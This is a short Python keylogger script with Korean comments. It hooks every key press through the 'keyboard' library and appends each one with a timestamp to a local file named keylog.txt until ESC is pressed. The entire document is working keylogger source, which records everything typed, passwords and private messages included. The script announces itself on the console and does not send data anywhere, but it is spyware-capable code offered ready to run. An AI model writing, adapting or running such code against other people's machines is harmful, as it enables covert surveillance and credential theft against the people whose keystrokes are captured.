import keyboard
import datetime

LOG_FILE = "keylog.txt"  # 키 입력을 저장할 파일 이름

# 키 입력을 파일에 저장하는 함수
def log_key(event):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key = event.name  # 입력된 키 이름
        if key == "space":
            key = " "  # 스페이스바는 공백으로 저장
        elif key == "enter":
            key = "\n"  # 엔터키는 줄바꿈 처리
        f.write(f"{timestamp} - {key}\n")  # 로그 저장

# 키 입력 감지 시작
keyboard.on_press(log_key)

print("키로거가 실행 중입니다. 종료하려면 'esc' 키를 누르세요.")
keyboard.wait("esc")  # ESC를 누르면 종료
print("키로거가 종료되었습니다.")
